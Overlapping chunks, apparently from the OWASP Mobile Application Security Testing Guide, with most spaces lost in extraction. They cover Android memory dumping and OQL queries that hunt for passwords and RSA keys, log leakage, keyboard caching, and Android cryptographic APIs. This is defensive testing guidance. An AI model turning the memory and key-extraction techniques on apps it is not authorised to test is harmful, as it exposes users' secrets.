Openstrings.txtinyourfavoriteeditoranddigthroughittoidentifysensitiveinformation. However if you’d like to inspect other kind of data, you’d rather want to use radare2 and its search capabilities. See radare2’shelponthesearchcommand(/?) formoreinformationandalistofoptions. Thefollowingshowsonlyasubset ofthem: $r2 <name_of_your_dump_file> [0x00000000]>/? Usage:/[!bf][arg] Searchstuff (see'e??search' foroptions) |Useio.vaforsearchinginnonvirtualaddressingspaces |/foo\\x00 searchforstring 'foo\\0' |/c[ar] searchforcryptomaterials |/e/E.F/i matchregularexpression |/ifoo searchforstring 'foo' ignoringcase |/m[?][ebm]magicfile searchformagic,filesystemsorbinaryheaders |/v[1248]value lookforan `cfg.bigendian`32bitvalue |/wfoo searchforwidestring 'f\\0o\\0o\\0' |/xff0033 searchforhexstring |/zminmax searchforstringsofgivensize ... Runtime Memory Analysis Insteadofdumpingthememorytoyourhostcomputer,youcanalternativelyuser2frida. Withit,youcananalyzeand inspecttheapp’smemorywhileit’srunning. Forexample,youmayruntheprevioussearchcommandsfromr2fridaand search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (andanyotherr2fridaspecificcommands)withabackslash: afterstartingthesessionwithr2 frida://usb//<name_- of_your_app>. Formoreinformation,optionsandapproaches,pleaserefertosection“In-MemorySearch”inthechapter“Tamperingand ReverseEngineeringonAndroid”. 212\\nExplicitly Dumping and Analyzing the Java Heap For rudimentary analysis, you can use Android Studio’s built-in tools. They are on the Android Monitor tab. To dump memory, selectthedeviceandappyouwanttoanalyzeandclickDumpJavaHeap. Thiswillcreatea.hprof fileinthe capturesdirectory,whichisontheapp’sprojectpath. Tonavigatethroughclassinstancesthatweresavedinthememorydump,selectthePackageTreeViewinthetabshowing the.hprof file. Formoreadvancedanalysisofthememorydump,usetheEclipseMemoryAnalyzerTool(MAT).ItisavailableasanEclipse pluginandasastandaloneapplication. ToanalyzethedumpinMAT,usethehprof-convplatformtool,whichcomeswiththeAndroidSDK. 213\\n./hprof-convmemory.hprofmemory-mat.hprof MAT provides several tools for analyzing the memory dump. For example, the Histogram provides an estimate of the numberofobjectsthathavebeencapturedfromagiventype,andtheThreadOverviewshowsprocesses’threadsand stack frames. The Dominator Tree provides information about keep-alive dependencies between objects. You can use regularexpressionstofiltertheresultsthesetoolsprovide. ObjectQueryLanguagestudioisaMATfeaturethatallowsyoutoqueryobjectsfromthememorydumpwithanSQL-like language. ThetoolallowsyoutotransformsimpleobjectsbyinvokingJavamethodsonthem,anditprovidesanAPIfor buildingsophisticatedtoolsontopoftheMAT. SELECT *FROM java.lang.String Intheexampleabove,allStringobjectspresentinthememorydumpwillbeselected. Theresultswillincludetheobject’s class,memoryaddress,value,andretaincount. Tofilterthisinformationandseeonlythevalueofeachstring,usethe followingcode: SELECT toString(object)FROM java.lang.String object",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 87
    }
  },
  {
    "text": "provides several tools for analyzing the memory dump. For example, the Histogram provides an estimate of the numberofobjectsthathavebeencapturedfromagiventype,andtheThreadOverviewshowsprocesses’threadsand stack frames. The Dominator Tree provides information about keep-alive dependencies between objects. You can use regularexpressionstofiltertheresultsthesetoolsprovide. ObjectQueryLanguagestudioisaMATfeaturethatallowsyoutoqueryobjectsfromthememorydumpwithanSQL-like language. ThetoolallowsyoutotransformsimpleobjectsbyinvokingJavamethodsonthem,anditprovidesanAPIfor buildingsophisticatedtoolsontopoftheMAT. SELECT *FROM java.lang.String Intheexampleabove,allStringobjectspresentinthememorydumpwillbeselected. Theresultswillincludetheobject’s class,memoryaddress,value,andretaincount. Tofilterthisinformationandseeonlythevalueofeachstring,usethe followingcode: SELECT toString(object)FROM java.lang.String object Or SELECT object.toString() FROM java.lang.String object SQLsupportsprimitivedatatypesaswell, soyoucandosomethinglikethefollowingtoaccessthecontentofallchar arrays: SELECT toString(arr) FROM char[]arr Don’tbesurprisedifyougetresultsthataresimilartothepreviousresults; afterall,StringandotherJavadatatypes arejustwrappersaroundprimitivedatatypes. Nowlet’sfiltertheresults. Thefollowingsamplecodewillselectallbyte arraysthatcontaintheASN.1OIDofanRSAkey. Thisdoesn’timplythatagivenbytearrayactuallycontainsanRSA(the samebytesequencemaybepartofsomethingelse),butthisisprobable. SELECT *FROM byte[]b WHERE toString(b).matches(\".*1\\.2\\.840\\.113549\\.1\\.1\\.1.*\") Finally,youdon’thavetoselectwholeobjects. ConsideranSQLanalogy: classesaretables,objectsarerows,andfields arecolumns. Ifyouwanttofindallobjectsthathavea“password”field,youcandosomethinglikethefollowing: SELECT password FROM \".*\" WHERE (null !=password) Duringyouranalysis,searchfor: • Indicativefieldnames: “password”,“pass”,“pin”,“secret”,“private”,etc. • Indicativepatterns(e.g.,RSAfootprints)instrings,chararrays,bytearrays,etc. • Knownsecrets(e.g.,acreditcardnumberthatyou’veenteredoranauthenticationtokenprovidedbythebackend) • etc. Repeatingtestsandmemorydumpswillhelpyouobtainstatisticsaboutthelengthofdataexposure. Furthermore,observ- ingthewayaparticularmemorysegment(e.g.,abytearray)changesmayleadyoutosomeotherwiseunrecognizable sensitivedata(moreonthisinthe“Remediation”sectionbelow). Determining Whether the Keyboard Cache Is Disabled for Text Input Fields 214\\nPlatform: android MASVSV1: MSTG-STORAGE-5 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis In the layout definition of an activity, you can define TextViews that have XML attributes. If the XML attribute an- droid:inputTypeisgiventhevaluetextNoSuggestions,thekeyboardcachewillnotbeshownwhentheinputfieldis selected. Theuserwillhavetotypeeverythingmanually. <EditText android:id=\"@+id/KeyBoardCache\" android:inputType=\"textNoSuggestions\" /> The code for all input fields that take sensitive information should include this XML attribute to disable the keyboard suggestions. Alternatively,thedevelopercanusethefollowingconstants: XMLandroid:inputType CodeInputType APIlevel textPassword TYPE_TEXT_VARIATION_PASSWORD 3 textVisiblePassword TYPE_TEXT_VARIATION_VISIBLE_PASSWORD 3 numberPassword TYPE_NUMBER_VARIATION_PASSWORD 11 textWebPassword TYPE_TEXT_VARIATION_WEB_PASSWORD 11 Check the application code to verify that none of the input types are being overwritten. For example, by doing findViewById(R.id.KeyBoardCache).setInputType(InputType.TYPE_CLASS_TEXT) the input type of the input field KeyBoardCacheissettotextreenablingthekeyboardcache. Finally,checktheminimumrequiredSDKversionintheAndroidManifest(android:minSdkVersion)sinceitmustsupport theusedconstants(forexample,AndroidSDKversion11isrequiredfortextWebPassword). Otherwise,thecompiledapp wouldnothonortheusedinputtypeconstantsallowingkeyboardcaching. Dynamic Analysis Starttheappandclickintheinputfieldsthattakesensitivedata. Ifstringsaresuggested,thekeyboardcachehasnot beendisabledforthesefields. Testing Logs for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-3 MASVSV2: MASVS-STORAGE-2 Overview Thistestcasefocusesonidentifyinganysensitiveapplicationdatawithinbothsystemandapplicationlogs. Thefollowing checksshouldbeperformed: 215\\n• Analyzesourcecodeforloggingrelatedcode. • Checkapplicationdatadirectoryforlogfiles. • Gathersystemmessagesandlogsandanalyzeforanysensitivedata. Asageneralrecommendationtoavoidpotentialsensitiveapplicationdataleakage,loggingstatementsshouldberemoved fromproductionreleasesunlessdeemednecessarytotheapplicationorexplicitlyidentifiedassafe,e.g.asaresultofa securityaudit. Static Analysis ApplicationswilloftenusetheLogClassandLoggerClasstocreatelogs. Todiscoverthis,youshouldaudittheapplication’s sourcecodeforanysuchloggingclasses. Thesecanoftenbefoundbysearchingforthefollowingkeywords: • Functionsandclasses,suchas: – android.util.Log – Log.d|Log.e|Log.i|Log.v|Log.w|Log.wtf – Logger • Keywordsandsystemoutput: – System.out.print|System.err.print – logfile – logging – logs While preparing the production release, you can use tools like ProGuard (included in Android Studio). To determine whetherallloggingfunctionsfromtheandroid.util.Log classhavebeenremoved, checktheProGuardconfiguration file (proguard-rules.pro) for the following options (according to this example of removing logging code and this article aboutenablingProGuardinanAndroidStudioproject): -assumenosideeffectsclassandroid.util.Log { publicstaticbooleanisLoggable(java.lang.String,int); publicstaticintv(...); publicstaticinti(...); publicstaticintw(...); publicstaticintd(...); publicstaticinte(...); publicstaticintwtf(...); } Note that the example above only ensures that calls to the Log class’ methods will be removed. If the string that will beloggedisdynamicallyconstructed,thecodethatconstructsthestringmayremaininthebytecode. Forexample,the followingcodeissuesanimplicitStringBuildertoconstructthelogstatement: ExampleinJava: Log.v(\"Privatekeytag\",\"Privatekey[byteformat]:\" +key); ExampleinKotlin: Log.v(\"Privatekeytag\",\"Privatekey[byteformat]: $key\") Thecompiledbytecode,however,isequivalenttothebytecodeofthefollowinglogstatement,whichconstructsthestring explicitly: ExampleinJava: Log.v(\"Privatekeytag\",newStringBuilder(\"Privatekey[byteformat]:\").append(key.toString()).toString()); ExampleinKotlin: 216\\nLog.v(\"Privatekeytag\",StringBuilder(\"Privatekey[byteformat]:\").append(key).toString()) ProGuardguaranteesremovaloftheLog.vmethodcall. Whethertherestofthecode(new StringBuilder ...) willbe removeddependsonthecomplexityofthecodeandtheProGuardversion. Thisisasecurityriskbecausethe(unused)stringleaksplaintextdataintomemory,whichcanbeaccessedviaadebugger ormemorydumping. Unfortunately,nosilverbulletexistsforthisissue,butoneoptionwouldbetoimplementacustomloggingfacilitythat takessimpleargumentsandconstructsthelogstatementsinternally. SecureLog.v(\"Privatekey[byteformat]:\",key); ThenconfigureProGuardtostripitscalls. Dynamic Analysis Useallthemobileappfunctionsatleastonce,thenidentifytheapplication’sdatadirectoryandlookforlogfiles(/data/ data/<package-name>). Check the application logs to determine whether log data has been generated; some mobile applicationscreateandstoretheirownlogsinthedatadirectory. ManyapplicationdevelopersstilluseSystem.out.printlnorprintStackTraceinsteadofaproperloggingclass. There- fore, your testing strategy must include all output generated while the application is starting, running and closing. To determinewhatdataisdirectlyprintedbySystem.out.printlnorprintStackTrace,youcanuseLogcatasexplained inthechapter“BasicSecurityTesting”,section“MonitoringSystemLogs”. RememberthatyoucantargetaspecificappbyfilteringtheLogcatoutputasfollows: adblogcat |grep \"$(adbshellps |grep <package-name>|awk'{print$2}')\" IfyoualreadyknowtheappPIDyoumaygiveitdirectlyusing--pidflag. Youmayalsowanttoapplyfurtherfiltersorregularexpressions(usinglogcat’sregexflags-e<expr>,--regex=<expr> forexample)ifyouexpectcertainstringsorpatternstocomeupinthelogs. Testing the Device-Access-Security Policy Platform: android MASVSV1: MSTG-STORAGE-11 MASVSV2: MASVS-STORAGE-1 Overview Appsthatprocessorquerysensitiveinformationshouldruninatrustedandsecureenvironment. Tocreatethisenviron- ment,theappcancheckthedeviceforthefollowing: • PIN-orpassword-protecteddevicelocking • RecentAndroidOSversion • USBDebuggingactivation • Deviceencryption • Devicerooting(seealso“TestingRootDetection”) 217\\nStatic Analysis Totestthedevice-access-securitypolicythattheappenforces,awrittencopyofthepolicymustbeprovided. Thepolicy should define available checks and their enforcement. For example, one check could require that the app run only on Android6.0(APIlevel23)oramorerecentversion,closingtheappordisplayingawarningiftheAndroidversionisless than6.0. Checkthesourcecodeforfunctionsthatimplementthepolicyanddeterminewhetheritcanbebypassed. YoucanimplementchecksontheAndroiddevicebyqueryingSettings.Secureforsystempreferences. DeviceAdminis- trationAPIofferstechniquesforcreatingapplicationsthatcanenforcepasswordpoliciesanddeviceencryption. Dynamic Analysis The dynamic analysis depends on the checks enforced by the app and their expected behavior. If the checks can be bypassed,theymustbevalidated. 218\\nAndroid Cryptographic APIs Overview Inthechapter“MobileAppCryptography”,weintroducedgeneralcryptographybestpracticesanddescribedtypicalissues thatcanoccurwhencryptographyisusedincorrectly. Inthischapter,we’llgointomoredetailonAndroid’scryptography",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 88
    }
  },
  {
    "text": "their enforcement. For example, one check could require that the app run only on Android6.0(APIlevel23)oramorerecentversion,closingtheappordisplayingawarningiftheAndroidversionisless than6.0. Checkthesourcecodeforfunctionsthatimplementthepolicyanddeterminewhetheritcanbebypassed. YoucanimplementchecksontheAndroiddevicebyqueryingSettings.Secureforsystempreferences. DeviceAdminis- trationAPIofferstechniquesforcreatingapplicationsthatcanenforcepasswordpoliciesanddeviceencryption. Dynamic Analysis The dynamic analysis depends on the checks enforced by the app and their expected behavior. If the checks can be bypassed,theymustbevalidated. 218\\nAndroid Cryptographic APIs Overview Inthechapter“MobileAppCryptography”,weintroducedgeneralcryptographybestpracticesanddescribedtypicalissues thatcanoccurwhencryptographyisusedincorrectly. Inthischapter,we’llgointomoredetailonAndroid’scryptography APIs. We’llshowhowtoidentifyusageofthoseAPIsinthesourcecodeandhowtointerpretcryptographicconfigurations. Whenreviewingcode,makesuretocomparethecryptographicparametersusedwiththecurrentbestpractices,aslinked inthisguide. WecanidentifykeycomponentsofcryptographysystemonAndroid: • SecurityProvider • KeyStore-seethesectionKeyStoreinthe“TestingDataStorage”chapter • KeyChain-seethesectionKeyChaininthe“TestingDataStorage”chapter AndroidcryptographyAPIsarebasedontheJavaCryptographyArchitecture(JCA).JCAseparatestheinterfacesandimple- mentation,makingitpossibletoincludeseveralsecurityprovidersthatcanimplementsetsofcryptographicalgorithms. MostoftheJCAinterfacesandclassesaredefinedinthejava.security.*andjavax.crypto.*packages. Inaddition, thereareAndroidspecificpackagesandroid.security.*andandroid.security.keystore.*. KeyStoreandKeyChainprovideAPIsforstoringandusingkeys(behindthescene,KeyChainAPIusesKeyStoresystem). These systems allow to administer the full lifecycle of the cryptographic keys. Requirements and guidance for imple- mentationofcryptographickeymanagementcanbefoundinKeyManagementCheatSheet. Wecanidentifyfollowing phases: • generatingakey • usingakey • storingakey • archivingakey • deletingakey Pleasenotethatstoringofakeyisanalyzedinthechapter“TestingDataStorage”. These phases are managed by the Keystore/KeyChain system. However how the system works depends on how the application developer implemented it. For the analysis process you should focus on functions which are used by the applicationdeveloper. Youshouldidentifyandverifythefollowingfunctions: • Keygeneration • Randomnumbergeneration • Keyrotation AppsthattargetmodernAPIlevels,wentthroughthefollowingchanges: • ForAndroid7.0(APIlevel24)andabovetheAndroidDeveloperblogshowsthat: – Itisrecommendedtostopspecifyingasecurityprovider. Instead,alwaysuseapatchedsecurityprovider. – The support for the Crypto provider has dropped and the provider is deprecated. The same applies to its SHA1PRNGforsecurerandom. • ForAndroid8.1(APIlevel27)andabovetheDeveloperDocumentationshowsthat: – Conscrypt,knownasAndroidOpenSSL,ispreferredaboveusingBouncyCastleandithasnewimplementations: AlgorithmParameters:GCM , KeyGenerator:AES, KeyGenerator:DESEDE, KeyGenerator:HMACMD5, KeyGen- erator:HMACSHA1, KeyGenerator:HMACSHA224, KeyGenerator:HMACSHA256, KeyGenerator:HMACSHA384, KeyGenerator:HMACSHA512,SecretKeyFactory:DESEDE,andSignature:NONEWITHECDSA. – You should not use the IvParameterSpec.class anymore for GCM, but use the GCMParameterSpec.class instead. – SocketshavechangedfromOpenSSLSocketImpltoConscryptFileDescriptorSocket,andConscryptEngi- neSocket. – SSLSessionwithnullparametersgiveaNullPointerException. 219\\n– Youneedtohavelargeenougharraysasinputbytesforgeneratingakeyotherwise,anInvalidKeySpecEx- ceptionisthrown. – IfaSocketreadisinterrupted,yougetaSocketException. • ForAndroid9(APIlevel28)andabovetheAndroidDeveloperBlogshowsevenmorechanges: – YougetawarningifyoustillspecifyasecurityproviderusingthegetInstancemethodandyoutargetany APIbelow28. IfyoutargetAndroid9(APIlevel28)orabove,yougetanerror. – TheCryptosecurityproviderisnowremoved. CallingitwillresultinaNoSuchProviderException. • ForAndroid10(APIlevel29)theDeveloperDocumentationlistsallnetworksecuritychanges. General Recommendations Thefollowinglistofrecommendationsshouldbeconsideredduringappexamination: • Youshouldensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. • Youshouldensurethatsecurityproviderhasthelatestupdates-Updatingsecurityprovider. • Youshouldstopspecifyingasecurityproviderandusethedefaultimplementation(AndroidOpenSSL,Conscrypt). • YoushouldstopusingCryptosecurityprovideranditsSHA1PRNGastheyaredeprecated. • YoushouldspecifyasecurityprovideronlyfortheAndroidKeystoresystem. • YoushouldstopusingPassword-basedencryptioncipherswithoutIV. • YoushoulduseKeyGenParameterSpecinsteadofKeyPairGeneratorSpec. Security Provider Androidreliesonthejava.security.ProviderclasstoimplementJavaSecurityservices. Theseprovidersarecrucialto ensuresecurenetworkcommunicationsandsecureotherfunctionalitieswhichdependoncryptography. ThelistofsecurityprovidersincludedinAndroidvariesbetweenversionsofAndroidandtheOEM-specificbuilds. Some securityproviderimplementationsinolderversionsarenowknowntobelesssecureorvulnerable. Thus,Androidappli- cationsshouldnotonlychoosethecorrectalgorithmsandprovideagoodconfiguration,insomecasestheyshouldalso payattentiontothestrengthoftheimplementationsinthelegacysecurityproviders. Youcanlistthesetofexistingsecurityprovidersusingfollowingcode: StringBuilderbuilder =newStringBuilder(); for(Providerprovider :Security.getProviders()){ builder.append(\"provider:\") .append(provider.getName()) .append(\"\") .append(provider.getVersion()) .append(\"(\") .append(provider.getInfo()) .append(\")\\n\"); } Stringproviders =builder.toString(); //nowdisplaythestringonthescreenorinthelogsfordebugging. ThisistheoutputforAndroid9(APIlevel28)runninginanemulatorwithGooglePlayAPIs: provider:AndroidNSSP1.0(AndroidNetworkSecurityPolicyProvider) provider:AndroidOpenSSL1.0(Android'sOpenSSL-backedsecurityprovider) provider:CertPathProvider1.0(ProviderofCertPathBuilderandCertPathVerifier) provider:AndroidKeyStoreBCWorkaround1.0(AndroidKeyStoresecurityprovidertoworkaroundBouncyCastle) provider:BC1.57(BouncyCastleSecurityProviderv1.57) provider:HarmonyJSSE1.0(HarmonyJSSEProvider) provider:AndroidKeyStore1.0(AndroidKeyStoresecurityprovider) Updating security provider Keeping up-to-date and patched component is one of security principles. The same applies to provider. Application shouldcheckifusedsecurityproviderisup-to-dateandifnot,updateit. 220\\nOlder Android versions ForsomeapplicationsthatsupportolderversionsofAndroid(e.g.: onlyusedversionslowerthanAndroid7.0(APIlevel 24)),bundlinganup-to-datelibrarymaybetheonlyoption. Conscryptlibraryisagoodchoiceinthissituationtokeep thecryptographyconsistentacrossthedifferentAPIlevelsandavoidhavingtoimportBouncyCastlewhichisaheavier library. ConscryptforAndroidcanbeimportedthisway: dependencies { implementation 'org.conscrypt:conscrypt-android:last_version' } Next,theprovidermustberegisteredbycalling: Security.addProvider(Conscrypt.newProvider()) Key Generation The Android SDK allows you to specify how a key should be generated, and under which circumstances it can be used. Android6.0(APIlevel23)introducedtheKeyGenParameterSpecclassthatcanbeusedtoensurethecorrectkeyusage intheapplication. Forexample: StringkeyAlias =\"MySecretKey\"; KeyGenParameterSpeckeyGenParameterSpec =newKeyGenParameterSpec.Builder(keyAlias, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setRandomizedEncryptionRequired(true) .build(); KeyGeneratorkeyGenerator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\"); keyGenerator.init(keyGenParameterSpec); SecretKeysecretKey =keyGenerator.generateKey(); TheKeyGenParameterSpecindicatesthatthekeycanbeusedforencryptionanddecryption,butnotforotherpurposes, suchassigningorverifying. Itfurtherspecifiestheblockmode(CBC),padding(PKCS#7), andexplicitlyspecifiesthat randomizedencryptionisrequired(thisisthedefault). Next,weenterAndroidKeyStoreasthenameoftheproviderin theKeyGenerator.getInstancecalltoensurethatthekeysarestoredintheAndroidKeyStore. GCMisanotherAESblockmodethatprovidesadditionalsecuritybenefitsoverother,oldermodes. Inadditiontobeing cryptographicallymoresecure,italsoprovidesauthentication. WhenusingCBC(andothermodes),authenticationwould needtobeperformedseparately,usingHMACs(seethe“TamperingandReverseEngineeringonAndroid”chapter). Note thatGCMistheonlymodeofAESthatdoesnotsupportpadding. Attemptingtousethegeneratedkeyinviolationoftheabovespecwouldresultinasecurityexception. Here’sanexampleofusingthatkeytoencrypt: StringAES_MODE =KeyProperties.KEY_ALGORITHM_AES +\"/\"+KeyProperties.BLOCK_MODE_CBC +\"/\"+KeyProperties.ENCRYPTION_PADDING_PKCS7; KeyStoreAndroidKeyStore =AndroidKeyStore.getInstance(\"AndroidKeyStore\"); //byte[]input Keykey =AndroidKeyStore.getKey(keyAlias,null); Ciphercipher =Cipher.getInstance(AES_MODE); cipher.init(Cipher.ENCRYPT_MODE,key); byte[]encryptedBytes =cipher.doFinal(input); byte[]iv=cipher.getIV(); //saveboththeIVandtheencryptedBytes BoththeIV(initializationvector)andtheencryptedbytesneedtobestored;otherwisedecryptionisnotpossible. Here’showthatciphertextwouldbedecrypted. Theinputistheencryptedbytearrayandivistheinitializationvector fromtheencryptionstep: 221\\n//byte[]input //byte[]iv Keykey =AndroidKeyStore.getKey(AES_KEY_ALIAS,null); Ciphercipher =Cipher.getInstance(AES_MODE); IvParameterSpecparams =newIvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE,key,params); byte[]result =cipher.doFinal(input); SincetheIVisrandomlygeneratedeachtime,itshouldbesavedalongwiththeciphertext(encryptedBytes)inorderto decryptitlater. Prior to Android 6.0 (API level 23), AES key generation was not supported. As a result, many implementations chose to use RSA and generated a public-private key pair for asymmetric encryption using KeyPairGeneratorSpec or used SecureRandomtogenerateAESkeys. Here’sanexampleofKeyPairGeneratorandKeyPairGeneratorSpecusedtocreatetheRSAkeypair: DatestartDate =Calendar.getInstance().getTime(); CalendarendCalendar =Calendar.getInstance(); endCalendar.add(Calendar.YEAR,1); DateendDate =endCalendar.getTime(); KeyPairGeneratorSpeckeyPairGeneratorSpec =newKeyPairGeneratorSpec.Builder(context) .setAlias(RSA_KEY_ALIAS) .setKeySize(4096) .setSubject(newX500Principal(\"CN=\" +RSA_KEY_ALIAS)) .setSerialNumber(BigInteger.ONE) .setStartDate(startDate) .setEndDate(endDate) .build(); KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance(\"RSA\", \"AndroidKeyStore\"); keyPairGenerator.initialize(keyPairGeneratorSpec); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); This sample creates the RSA key pair with a key size of 4096-bit (i.e. modulus size). Elliptic Curve (EC) keys can also begeneratedinasimilarway. HoweverasofAndroid11(APIlevel30),AndroidKeyStoredoesnotsupportencryptionor decryptionwithECkeys. Theycanonlybeusedforsignatures. AsymmetricencryptionkeycanbegeneratedfromthepassphrasebyusingthePasswordBasedKeyDerivationFunction version 2 (PBKDF2). This cryptographic protocol is designed to generate cryptographic keys, which can be",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 89
    }
  },
  {
    "text": ".setEndDate(endDate) .build(); KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance(\"RSA\", \"AndroidKeyStore\"); keyPairGenerator.initialize(keyPairGeneratorSpec); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); This sample creates the RSA key pair with a key size of 4096-bit (i.e. modulus size). Elliptic Curve (EC) keys can also begeneratedinasimilarway. HoweverasofAndroid11(APIlevel30),AndroidKeyStoredoesnotsupportencryptionor decryptionwithECkeys. Theycanonlybeusedforsignatures. AsymmetricencryptionkeycanbegeneratedfromthepassphrasebyusingthePasswordBasedKeyDerivationFunction version 2 (PBKDF2). This cryptographic protocol is designed to generate cryptographic keys, which can be used for cryptographypurpose. Inputparametersforthealgorithmareadjustedaccordingtoweakkeygenerationfunctionsection. Thecodelistingbelowillustrateshowtogenerateastrongencryptionkeybasedonapassword. public static SecretKey generateStrongAESKey(char[]password,intkeyLength) { //Initializeobjectsandvariablesforlateruse intiterationCount =10000; intsaltLength =keyLength /8; SecureRandomrandom =newSecureRandom(); //Generatethesalt byte[]salt =newbyte[saltLength]; random.nextBytes(salt); KeySpeckeySpec =newPBEKeySpec(password.toCharArray(),salt,iterationCount,keyLength); SecretKeyFactorykeyFactory =SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\"); byte[]keyBytes =keyFactory.generateSecret(keySpec).getEncoded(); return newSecretKeySpec(keyBytes,\"AES\"); } Theabovemethodrequiresacharacterarraycontainingthepasswordandtheneededkeylengthinbits,forinstancea128 or256-bitAESkey. Wedefineaniterationcountof10,000roundswhichwillbeusedbythePBKDF2algorithm. Increasing the number of iterations significantly increases the workload for a brute-force attack on the password, however it can affectperformanceasmorecomputationalpowerisrequiredforkeyderivation. Wedefinethesaltsizeequaltothekey lengthdividedby8inordertoconvertfrombitstobytesandweusetheSecureRandomclasstorandomlygenerateasalt. Thesaltneedstobekeptconstanttoensurethesameencryptionkeyisgeneratedtimeaftertimeforthesamesupplied password. NotethatyoucanstorethesaltprivatelyinSharedPreferences. Itisrecommendedtoexcludethesaltfrom theAndroidbackupmechanismtopreventsynchronizationincaseofhigherriskdata. 222\\nNote that if you take a rooted device or a patched (e.g. repackaged) application into account as a threat to the data,itmightbebettertoencryptthesaltwithakeythatisplacedintheAndroidKeystore. ThePassword-Based Encryption(PBE)keyisgeneratedusingtherecommendedPBKDF2WithHmacSHA1algorithm,untilAndroid8.0(API level26). ForhigherAPIlevels,itisbesttousePBKDF2withHmacSHA256,whichwillendupwithalongerhashvalue. Note: thereisawidespreadfalsebelievethattheNDKshouldbeusedtohidecryptographicoperationsandhardcoded keys. However,usingthismechanismisnoteffective. Attackerscanstillusetoolstofindthemechanismusedandmake dumpsofthekeyinmemory. Next,thecontrolflowcanbeanalyzedwithe.g.radare2andthekeysextractedwiththe help of Frida or the combination of both: r2frida (see sections “Disassembling Native Code”, “Memory Dump” and “In- MemorySearch”inthechapter“TamperingandReverseEngineeringonAndroid”formoredetails). FromAndroid7.0(API level24)onward,itisnotallowedtouseprivateAPIs,instead: publicAPIsneedtobecalled,whichfurtherimpactsthe effectivenessofhidingitawayasdescribedintheAndroidDevelopersBlog Random number generation Cryptographyrequiressecurepseudorandomnumbergeneration(PRNG).StandardJavaclassesasjava.util.Random donotprovidesufficientrandomnessandinfactmaymakeitpossibleforanattackertoguessthenextvaluethatwillbe generated,andusethisguesstoimpersonateanotheruseroraccesssensitiveinformation. Ingeneral,SecureRandomshouldbeused. However,iftheAndroidversionsbelowAndroid4.4(APIlevel19)aresupported, additionalcareneedstobetakeninordertoworkaroundthebuginAndroid4.1-4.3(APIlevel16-18)versionsthatfailed toproperlyinitializethePRNG. MostdevelopersshouldinstantiateSecureRandomviathedefaultconstructorwithoutanyarguments. Otherconstructors areformoreadvancedusesand,ifusedincorrectly,canleadtodecreasedrandomnessandsecurity. ThePRNGprovider backingSecureRandomusestheSHA1PRNGfromAndroidOpenSSL(Conscrypt)provider. Testing Symmetric Cryptography Platform: android MASVSV1: MSTG-CRYPTO-1 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Identify all the instances of symmetric key encryption in code and look for any mechanism which loads or provides a symmetrickey. Youcanlookfor: • symmetricalgorithms(suchasDES,AES,etc.) • specifications for a key generator (such as KeyGenParameterSpec, KeyPairGeneratorSpec, KeyPairGenerator, KeyGenerator,KeyProperties,etc.) • classesimportingjava.security.*,javax.crypto.*,android.security.*,android.security.keystore.* Checkalsothelistofcommoncryptographicconfigurationissues. Foreachidentifiedinstanceverifyiftheusedsymmetrickeys: • arenotpartoftheapplicationresources • cannotbederivedfromknownvalues • arenothardcodedincode Foreachhardcodedsymmetrickey, verifythatisnotusedinsecurity-sensitivecontextsastheonlymethodofencryp- tion. 223\\nAsanexampleweillustratehowtolocatetheuseofahardcodedencryptionkey. Firstdisassembleanddecompilethe apptoobtainJavacode,e.g.byusingjadx. NowsearchthefilesfortheusageoftheSecretKeySpecclass,e.g.bysimplyrecursivelygreppingonthemorusingjadx searchfunction: grep -r\"SecretKeySpec\" ThiswillreturnallclassesusingtheSecretKeySpecclass. Nowexaminethosefilesandtracewhichvariablesareusedto passthekeymaterial. Thefigurebelowshowstheresultofperformingthisassessmentonaproductionreadyapplication. WecanclearlylocatetheuseofastaticencryptionkeythatishardcodedandinitializedinthestaticbytearrayEncrypt. keyBytes. Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. Testing the Configuration of Cryptographic Standard Algorithms Platform: android MASVSV1: MSTG-CRYPTO-2,MSTG-CRYPTO-3,MSTG-CRYPTO-4 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Identifyalltheinstancesofthecryptographicprimitivesincode. Identifyallcustomcryptographyimplementations. You canlookfor: • classesCipher,Mac,MessageDigest,Signature 224\\n• interfacesKey,PrivateKey,PublicKey,SecretKey • functionsgetInstance,generateKey • exceptionsKeyStoreException,CertificateException,NoSuchAlgorithmException • classeswhichusesjava.security.*,javax.crypto.*,android.security.*andandroid.security.keystore. *packages. IdentifythatallcallstogetInstanceusedefaultproviderofsecurityservicesbynotspecifyingit(itmeansAndroidOpenSSL akaConscrypt). ProvidercanonlybespecifiedinKeyStorerelatedcode(inthatsituationKeyStoreshouldbeprovided asprovider). Ifotherproviderisspecifieditshouldbeverifiedaccordingtosituationandbusinesscase(i.e.Android APIversion),andprovidershouldbeexaminedagainstpotentialvulnerabilities. Ensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. Lookatinsecureand deprecatedalgorithmsandcommonconfigurationissues. Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. Testing Random Number Generation Platform: android MASVSV1: MSTG-CRYPTO-6 MASVSV2: MASVS-CRYPTO-1 